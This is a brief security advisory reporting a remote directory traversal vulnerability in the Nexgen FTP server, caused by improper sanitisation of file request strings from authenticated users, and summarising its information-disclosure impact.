It has been reported that the Nexgen FTP server is prone to a remote directory traversal vulnerability. This issue is due to a failure of the application to properly sanitize file request strings from authenticated users.

Successful exploitation of this vulnerability may allow a remote attacker to gain access to sensitive information that may be used to launch further attacks against a vulnerable system.
